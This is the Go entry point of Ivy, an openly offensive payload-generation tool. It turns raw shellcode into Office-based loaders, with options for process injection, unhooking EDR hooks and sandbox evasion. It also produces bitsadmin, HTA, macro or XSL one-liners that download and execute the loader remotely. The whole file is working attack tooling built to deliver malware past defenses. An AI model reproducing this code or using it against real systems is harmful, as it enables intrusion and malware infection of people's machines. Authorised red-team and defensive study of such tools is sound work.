package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"strings"

	"github.com/optiv/Ivy/Cryptor"
	"github.com/optiv/Ivy/Loader"
	"github.com/optiv/Ivy/Utils"
)

var (
	debugging   bool
	debugWriter io.Writer
)

// FlagOptions ...
type FlagOptions struct {
	payloadtype   string
	outFile       string
	product       string
	stageless     bool
	unhook        bool
	inputFile32   string
	inputFile64   string
	CommandLoader string
	URL           string
	sandbox       bool
	process32     string
	process64     string
}

func options() *FlagOptions {
	payloadtype := flag.String("P", "", "Payload type \"Inject\" (Which performs a process injection) or \"Local\" (Which loads the payload directly into the current process)")
	outFile := flag.String("O", "", "Name of output file")
	product := flag.String("product", "Excel", "Name of the office product to use (Excel, Word, PowerPoint)")
	debug := flag.Bool("debug", false, "Print debug statements")
	sandbox := flag.Bool("sandbox", false, "Enable sandbox evasion controls (i.e. checks if the system is domain joined)")
	unhook := flag.Bool("unhook", false, "Unhooks EDR's hooks before loading payload")
	URL := flag.String("url", "", "URL assoicated with the Delivery option to retrieve the payload. (e.g https://acme.com/)")
	CommandLoader := flag.String("delivery", "", `Generates an one-liner command to download and execute the payload remotely:
[*] bits - Generates a Bitsadmin one liner command to download, execute and remove the loader.
[*] hta - Generates a blank hta file containing the loader along with a one liner command execute the loader remotely.
[*] macro - Generates an office macro that would download and execute a the loader remotely.
[*] xsl - Generates a xsl stylesheet file containing the loader along with a one liner command execute the loader remotely.`)
	stageless := flag.Bool("stageless", false, "Enables stageless payload. When this option is enabled use a raw payload (aka .bin files) instead of .c code")
	inputFile32 := flag.String("Ix86", "", "Path to the x86 payload")
	inputFile64 := flag.String("Ix64", "", "Path to the x64 payload")
	process32 := flag.String("process32", "", "The full path to the x86 application to spawn. Only use applications that are found in System32 & SYSWOW64  (use \\ for the path) (default is rundll32.exe)")
	process64 := flag.String("process64", "", "The full path to the x64 application to spawn. Please  specify the path to the process to create/inject into (use \\ for the path) (default is explorer.exe)")
	flag.Parse()
	debugging = *debug
	debugWriter = os.Stdout
	return &FlagOptions{payloadtype: *payloadtype, outFile: *outFile, product: *product, inputFile64: *inputFile64, inputFile32: *inputFile32, CommandLoader: *CommandLoader, URL: *URL, stageless: *stageless, unhook: *unhook, sandbox: *sandbox, process32: *process32, process64: *process64}
}

func main() {
	fmt.Println(`

     ___   ___      ___  ___    ___ 
    |\  \ |\  \    /  /||\  \  /  /|
    \ \  \\ \  \  /  / /\ \  \/  / /
     \ \  \\ \  \/  / /  \ \    / / 
      \ \  \\ \    / /    \/  /  /  
       \ \__\\ \__/ /   __/  / /    
        \|__| \|__|/   |\___/ /     
                       \|___|/   
                       (@Tyl0us)
The suffering. The pain. Can't you hear them? 
Their cries for mercy?
`)
	opt := options()

	var rawpayload32 []string
	var rawpayload64 []string
	var strawpayload32 string
	var strawpayload64 string

	if opt.payloadtype == "Inject" || opt.payloadtype == "Local" {

	} else {
		log.Fatal("Error: Invalid payload type")
	}

	if opt.inputFile32 == "" && opt.inputFile64 == "" {
		log.Fatal("Error: Please provide a path to a file containing a raw shellcode or  payload")
	}
	if opt.outFile == "" {
		log.Fatal("Error: Please provide a name for the payload the you wish to generate")
	}
	if opt.CommandLoader != "" && opt.CommandLoader != "bits" && opt.CommandLoader != "hta" && opt.CommandLoader != "macro" && opt.CommandLoader != "xsl" {
		log.Fatal("Error: Invalid delivery command option, please choose one of the acceptable options")
	}
	if opt.inputFile32 != "" && opt.stageless == false {
		Utils.PrintDebug(debugging, "Reading payload file %s\n", opt.inputFile32)
		rawinputfile32 := Utils.Readfile(opt.inputFile32)

		Utils.PrintDebug(debugging, "Appending payload %v\n", rawinputfile32)
		for _, rawpayloadlines32 := range rawinputfile32 {
			rawpayloadlines32 = string(rawpayloadlines32 + "\n")
			rawpayload32 = append(rawpayload32, rawpayloadlines32)
		}

	}
	if opt.inputFile64 != "" && opt.stageless == false {
		Utils.PrintDebug(debugging, "Reading payload file %s\n", opt.inputFile64)
		rawinputfile64 := Utils.Readfile(opt.inputFile64)

		Utils.PrintDebug(debugging, "Appending payload %v\n", rawinputfile64)
		for _, rawpayloadlines64 := range rawinputfile64 {
			rawpayloadlines64 = string(rawpayloadlines64 + "\n")
			rawpayload64 = append(rawpayload64, rawpayloadlines64)
		}

	}
	if opt.inputFile64 != "" && opt.stageless == true {
		Utils.PrintDebug(debugging, "Reading payload file %s\n", opt.inputFile64)
		src, _ := ioutil.ReadFile(opt.inputFile64)
		if opt.payloadtype == "Inject" {
			var rawbyte []byte
			rawbyte = src
			strawpayload64 = Cryptor.StagelessArrayGen(rawbyte)
		} else if opt.payloadtype == "Local" {
			strawpayload64 = hex.EncodeToString(src)
		}
	}

	if opt.inputFile32 != "" && opt.stageless == true {
		Utils.PrintDebug(debugging, "Reading payload file %s\n", opt.inputFile32)
		src, _ := ioutil.ReadFile(opt.inputFile32)
		if opt.payloadtype == "Inject" {
			var rawbyte []byte
			rawbyte = src
			strawpayload32 = Cryptor.StagelessArrayGen(rawbyte)
		} else if opt.payloadtype == "Local" {
			strawpayload32 = hex.EncodeToString(src)
		}

	}
	var rrawpayload64 string
	var rrawpayload32 string
	if opt.stageless == true {
		rrawpayload64 = strawpayload64
		rrawpayload32 = strawpayload32
	} else {
		rrawpayload64 = strings.Join(rawpayload64, "")
		rrawpayload32 = strings.Join(rawpayload32, "")
	}

	Loader.Varibles(opt.stageless, opt.payloadtype, opt.outFile, opt.URL, opt.CommandLoader, opt.sandbox, debugging, opt.unhook, rrawpayload64, rrawpayload32, opt.process32, opt.process64, opt.product)
	fmt.Println("[+] Loader File Generated: " + opt.outFile + "")
	fmt.Println("[*] Remember the systems targeted need to have Office installed in order to work")
	Utils.Commands(opt.URL, opt.CommandLoader, opt.outFile)

}
